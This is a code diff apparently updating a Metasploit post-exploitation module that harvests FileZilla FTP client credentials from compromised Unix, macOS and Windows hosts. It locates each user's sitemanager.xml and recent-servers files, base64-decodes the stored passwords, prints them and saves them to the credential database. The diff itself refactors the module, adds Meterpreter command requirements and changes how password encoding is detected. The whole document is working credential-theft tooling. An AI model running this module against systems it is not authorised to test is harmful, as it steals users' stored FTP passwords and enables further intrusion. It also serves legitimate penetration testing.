@@ -1,45 +1,59 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Post
-
+class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'           => 'Multi Gather FileZilla FTP Client Credential Collection',
-      'Description'    => %q{ This module will collect credentials from the FileZilla FTP client if it is installed. },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather FileZilla FTP Client Credential Collection',
+        'Description' => %q{ This module will collect credentials from the FileZilla FTP client if it is installed. },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'bannedit', # post port, added support for shell sessions
           'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
         ],
-      'Platform'       => %w{ bsd linux osx unix win },
-      'SessionTypes'   => ['shell', 'meterpreter' ]
-    ))
+        'Platform' => %w{bsd linux osx unix win},
+        'SessionTypes' => ['shell', 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_write
+              stdapi_fs_stat
+              stdapi_sys_config_getenv
+              stdapi_sys_config_getuid
+            ]
+          }
+        }
+      )
+    )
   end
 
   def run
     paths = []
     case session.platform
-    when /unix|linux|bsd/
+    when 'unix', 'linux', 'bsd'
       @platform = :unix
       paths = enum_users_unix
-    when /osx/
+    when 'osx'
       @platform = :osx
       paths = enum_users_unix
-    when /win/
+    when 'windows'
+      @platform = :windows
       profiles = grab_user_profiles()
       profiles.each do |user|
         next if user['AppData'] == nil
+
         fzdir = check_filezilla(user['AppData'])
         paths << fzdir if fzdir
       end
@@ -86,11 +100,11 @@ class Metasploit3 < Msf::Post
 
       stat = session.shell_command("ls #{dir}/.filezilla/sitemanager.xml")
       next if stat =~ /No such file/i
+
       paths << "#{dir}/.filezilla"
     end
     return paths
   end
-
 
   def check_filezilla(filezilladir)
     print_status("Checking for Filezilla directory in: #{filezilladir}")
@@ -102,7 +116,6 @@ class Metasploit3 < Msf::Post
     end
     return nil
   end
-
 
   def report_cred(opts)
     service_data = {
@@ -120,7 +133,7 @@ class Metasploit3 < Msf::Post
       origin_type: :session,
       private_data: opts[:password],
       private_type: :password,
-      username: opts[:user]
+      username: opts[:username]
     }.merge(service_data)
 
     login_data = {
@@ -131,18 +144,7 @@ class Metasploit3 < Msf::Post
     create_credential_login(login_data)
   end
 
-  def is_base64?(str)
-    str.match(/^([A-Za-z0-9+\/]{4})*([A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)$/) ? true : false
-  end
-
-
-  def try_decode_password(str)
-    is_base64?(str) ? Rex::Text.decode_base64(str) : str
-  end
-
-
   def get_filezilla_creds(paths)
-
     sitedata = ""
     recentdata = ""
     creds = []
@@ -199,12 +201,11 @@ class Metasploit3 < Msf::Post
             port: loot['port'],
             service_name: 'ftp',
             username: loot['user'],
-            password: try_decode_password(loot['password'])
+            password: loot['password']
           )
         end
       end
     end
-
   end
 
   def parse_accounts(data)
@@ -223,7 +224,11 @@ class Metasploit3 < Msf::Post
         account['logontype'] = "Anonymous"
       when /1|4/
         account['user'] = sub.elements['User'].text rescue "<unknown>"
-        account['password'] = sub.elements['Pass'].text rescue "<unknown>"
+        if sub.elements['Pass'].attributes['encoding'] == 'base64'
+          account['password'] = Rex::Text.decode_base64(sub.elements['Pass'].text) rescue "<unknown>"
+        else
+          account['password'] = sub.elements['Pass'].text rescue "<unknown>"
+        end
       when /2|3/
         account['user'] = sub.elements['User'].text rescue "<unknown>"
         account['password'] = "<blank>"
@@ -252,7 +257,7 @@ class Metasploit3 < Msf::Post
       print_status("    Server: %s:%s" % [account['host'], account['port']])
       print_status("    Protocol: %s" % account['protocol'])
       print_status("    Username: %s" % account['user'])
-      print_status("    Password: %s" % try_decode_password(account['password']))
+      print_status("    Password: %s" % account['password'])
       print_line("")
     end
     return creds
